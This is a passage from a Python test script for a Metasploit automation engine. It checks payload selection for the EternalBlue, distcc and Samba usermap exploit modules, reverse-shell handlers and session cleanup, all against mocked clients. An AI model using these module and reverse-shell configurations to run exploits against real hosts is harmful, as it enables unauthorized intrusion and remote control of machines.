        modules_dict={('exploit', short): mod},
        output_sequence=out,
        sessions_after=[{'id': str(session_id), 'type': 'meterpreter',
                         'target': rhost, 'user': 'SYSTEM'}],
    )
    client.consoles = CapConsoles(out)
    eng = make_engine_with_client(client)
    result = eng.run_exploit(
        module,
        options={'RHOSTS': rhost, 'LHOST': lhost},
        payload=None,
        action='run')
    return eng, written, result

module = 'exploit/windows/smb/ms17_010_eternalblue'
rhost  = '192.168.1.44'
lhost  = '192.168.1.254'

# First blank run should use curated staged payload.
eng, writes1, result1 = _capture_blank_run(module, rhost, lhost, session_id=88)
if any('set PAYLOAD windows/x64/meterpreter/reverse_tcp' in x for x in writes1):
    ok("First blank run uses curated staged payload (meterpreter/reverse_tcp)")
else:
    fail(f"First blank run payload write mismatch: {writes1}")

# Simulate dead session feedback from Shell interaction.
dead = eng._classify_session_error(RuntimeError('Session ID (88) does not exist'), '88')
if dead.get('session_dead') and 'Re-launch the exploit' in dead.get('message', ''):
    ok("Dead session message instructs re-launch with adaptation context")
else:
    fail(f"Dead-session message incomplete: {dead}")

# Next blank run, same module+target should switch to stageless payload.
eng2, writes2, result2 = _capture_blank_run(module, rhost, lhost, session_id=89)
# Carry adaptation state forward as if same long-running engine instance.
eng2._dead_session_counts = dict(eng._dead_session_counts)
eng2._session_origin = dict(eng._session_origin)
result2 = eng2.run_exploit(
    module,
    options={'RHOSTS': rhost, 'LHOST': lhost},
    payload=None,
    action='run')
writes2 = ''.join(eng2._client.consoles.created[-1]._writes)
if 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' in writes2:
    ok("Adaptive retry applies validated staged payload after death")
else:
    fail(f"Adaptive payload not applied on retry: {writes2}")


# ── Test: distcc handler-first arms background handler before exploit ─────────
from modules.msf_engine import _HANDLER_FIRST_EXPLOITS

distcc = 'exploit/unix/misc/distcc_exec'
w = _capture_run(distcc, auto_migrate=False,
                 payload='cmd/unix/reverse_perl',
                 options={'RHOSTS': '10.0.0.50', 'LHOST': '192.168.1.171',
                          'RPORT': 3632})
joined = '\n'.join(w)
if ('use exploit/multi/handler' in joined
        and 'run -j' in joined
        and 'set DisablePayloadHandler true' in joined
        and 'set WfsDelay 10' in joined):
    ok("distcc reverse_perl uses handler-first console sequence")
else:
    fail(f"distcc handler-first sequence missing: {w}")

# Blank distcc payload auto-selects reverse_perl
w2 = _capture_run(distcc, auto_migrate=False, payload=None,
                  options={'RHOSTS': '10.0.0.50', 'LHOST': '192.168.1.171',
                           'RPORT': 3632})
if any('set PAYLOAD cmd/unix/reverse_perl' in x for x in w2):
    ok("Blank distcc auto-selects reverse_perl curated default")
else:
    fail(f"Blank distcc did not set reverse_perl: {w2}")

if distcc in _HANDLER_FIRST_EXPLOITS:
    ok("_HANDLER_FIRST_EXPLOITS includes distcc_exec")
else:
    fail("_HANDLER_FIRST_EXPLOITS missing distcc_exec")

w3 = _capture_run('exploit/multi/samba/usermap_script', auto_migrate=False,
                  payload='cmd/unix/reverse_perl',
                  options={'RHOSTS': '10.0.0.50', 'LHOST': '192.168.1.171',
                           'RPORT': 139})
if 'use exploit/multi/handler' not in '\n'.join(w3):
    ok("usermap_script does not use handler-first (Samba timing differs)")
else:
    fail("usermap_script wrongly used handler-first")

# ── Test: kill_all_sessions stops every listed session ────────────────────────
class MockSession:
    def __init__(self, sid):
        self.sid = sid
        self.stopped = False
    def stop(self):
        self.stopped = True


class MockSessionsMgr:
    def __init__(self, session_ids):
        self._sessions = {str(s): MockSession(str(s)) for s in session_ids}
        self.list = {str(s): {'type': 'meterpreter'} for s in session_ids}
    def session(self, sid):
        return self._sessions[str(sid)]


class KillAllClient:
    def __init__(self, session_ids):
        self.sessions = MockSessionsMgr(session_ids)


eng_kill = MsfEngine()
eng_kill._client = KillAllClient(['3', '7', '12'])
eng_kill._connected = True
eng_kill._session_origin = {'3': {'module': 'x', 'rhost': '1.2.3.4'}}
result_kill = eng_kill.kill_all_sessions()
stopped = [eng_kill._client.sessions.session(s).stopped
           for s in ('3', '7', '12')]
if (result_kill.get('status') == 'ok'
        and result_kill.get('count') == 3
        and all(stopped)
        and '3' not in eng_kill._session_origin):
    ok("kill_all_sessions stops every session and clears origin tracking")
else:
    fail(f"kill_all_sessions: {result_kill}, stopped={stopped}, "
         f"origin={eng_kill._session_origin}")


# ── Test: kill_session stops one session and clears its origin ────────────────
eng_one = MsfEngine()
eng_one._client = KillAllClient(['4', '9'])
eng_one._connected = True
eng_one._session_origin = {'4': {'module': 'x', 'rhost': '192.168.1.44'},
                           '9': {'module': 'y', 'rhost': '10.0.0.2'}}
res_one = eng_one.kill_session('4')
if (res_one.get('status') == 'ok'
        and res_one.get('killed') == '4'
        and eng_one._client.sessions.session('4').stopped
        and not eng_one._client.sessions.session('9').stopped
        and '4' not in eng_one._session_origin
        and '9' in eng_one._session_origin):
    ok("kill_session stops only the target session and clears its origin")
else:
    fail(f"kill_session single-target: {res_one}, "
         f"origin={eng_one._session_origin}")

# Already-gone session should still report ok (desired end state reached)
class GoneSessionsMgr(MockSessionsMgr):
    def session(self, sid):
        raise RuntimeError(f'Session ID ({sid}) does not exist')
eng_gone = MsfEngine()
eng_gone._client = type('C', (), {'sessions': GoneSessionsMgr(['4'])})()
eng_gone._connected = True
res_gone = eng_gone.kill_session('4')
if res_gone.get('status') == 'ok' and 'already gone' in res_gone.get('message', ''):
    ok("kill_session treats an already-dead session as success")
else:
    fail(f"kill_session already-gone handling: {res_gone}")


# ── Summary ───────────────────────────────────────────────────────────────────
print()
print("═" * 72)
print(f" MSF RUNNER AUDIT — {len(FAIL)} FAIL · {len(OK)} OK")
print("═" * 72)
if FAIL:
    print("\nFAIL:")
    for m in FAIL: print(f"  ✗ {m}")
print("\nPASSED:")
for m in OK: print(f"  ✓ {m}")
sys.exit(1 if FAIL else 0)
